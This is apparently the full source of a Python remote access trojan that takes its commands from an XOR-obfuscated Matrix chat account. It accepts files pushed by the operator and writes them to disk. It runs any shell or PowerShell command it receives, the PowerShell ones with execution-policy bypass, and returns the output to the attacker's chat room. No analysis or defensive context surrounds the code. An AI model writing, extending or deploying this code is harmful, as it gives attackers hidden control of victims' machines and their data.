# -*- coding: utf-8 -*-
import requests
from shutil import copyfile, copyfileobj, rmtree
import time
from matrix_client.client import MatrixClient
from matrix_client.api import MatrixRequestError
from requests.exceptions import MissingSchema
import subprocess, tempfile, sys, os

def obfus(s):
    mask = '..............'
    nmask = [ord(c) for c in mask]
    lmask = len(mask)
    return ''.join([chr(ord(c) ^ nmask[i % lmask])
                    for i, c in enumerate(s)])
                    
def split_string(n, st):
    lst = ['']
    for i in str(st):
        l = len(lst) - 1
        if len(lst[l]) < n: 
            lst[l] += i
        else:
            lst += [i]
    return lst
    
def posh(command):
    commandline = ['powershell.exe',' -NoLogo','-ExecutionPolicy','Bypass','-File']
    with tempfile.NamedTemporaryFile(suffix=".ps1",delete=False) as g:
        g.write(command)
    commandline.append(g.name)
    try:
        result = subprocess.check_output(commandline)
        exitcode = 0
    except subprocess.CalledProcessError as err:
        result = err.output
        exitcode = err.returncode
    os.unlink(g.name)
    return exitcode , result
    
def on_message(room, event):

    #print  event

    if event['type'] == "m.room.member":
        
        if event['membership'] == "join":
            print("{0} joined".format(event['content']['displayname']))
    elif event['type'] == "m.room.message":
    
        if event['sender'] == obfus('8\x01\x19\r\x06\x04\x10QU\x19\x11\n\x06\x11Y\x0c\x19_'):
        
            if event['content']['msgtype'] == "m.file":
            
                link = obfus("\x10\x11\x0c\x1fSXL\x06Y\x0c\x17\x11\x17G\x18\x11\x0c\x17'\x08\x19\x1b\x1b\x1e\x1bDU\x1d\x01\x11\x0eF\x05SD\\\x17\x12\x16\x03\x06\x16\x07D"
) + event['content']['url'][6:]
                file_name = event['content']['body']
                file = (requests.get(link, stream=True)).raw
                with open(  file_name, 'wb') as out_file:
                    copyfileobj(file, out_file)
                    
                resp = 'File received.'
                room.send_text(resp.decode( 'unicode-escape' ).encode( 'utf-8' ))
        
        

        
        
            if event['content']['msgtype'] == "m.text":
            
                message =  event['content']['body']

                    
                if message[0] == "#"     : 
                
                    message =  message[1:]
                    retcode, retval = posh(message)
                    room.send_text(retval.decode( 'unicode-escape' ).encode( 'utf-8' ))
                    
                else:   
                    
                                        
                    if message[:3] == "cd "  : 
            
                        os.chdir(message[3:])
                        message = "cd"
                
                    
                    result_command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE ,stdin=subprocess.PIPE).communicate()
                            
                    with open( 'c:/rat/respuesta.txt', 'w') as f:   
                        for resp in result_command:
                            print  len(resp)
                            if len(resp) < 9999:
                                room.send_text(resp.decode( 'unicode-escape' ).encode( 'utf-8' ))
                                f.write (resp)
                            else:
                                
                                f.write (resp)
                                
                
                
                    
    else:
        
        print
        
    

def main(host, username, password, room_id_alias):
    client = MatrixClient(host)
    try:
        client.login_with_password(username, password)
    except MatrixRequestError as e:
        print(e)
        if e.code == 403:
            print ""
        else:
            print ""
    except MissingSchema as e:
        print(e)
    try:
        room = client.join_room(room_id_alias)
    except MatrixRequestError as e:
        print(e)
        if e.code == 400:
            print ""
        else:
            print ""
            
    room.add_listener(on_message)
    client.start_listener_thread()

    while True:
        
        time.sleep(5)

        
        
if __name__ == '__main__':

    host =obfus( '\x10\x11\x0c\x1fSXL\x06Y\x0c\x17\x11\x17G\x18\x11\x0c')
    username = obfus('\r\x0b\x11\x1f\x1b\x18')
    password = obfus('\x1b\n\x16\n\x03\x18QY')
    room_id_alias = obfus('[\x06\x10\x0e\x1b\x1b\x02R\x01A\\B\x02\x08\x03\x11\x02@V\n\n\x08')


    main(host, username, password, room_id_alias)
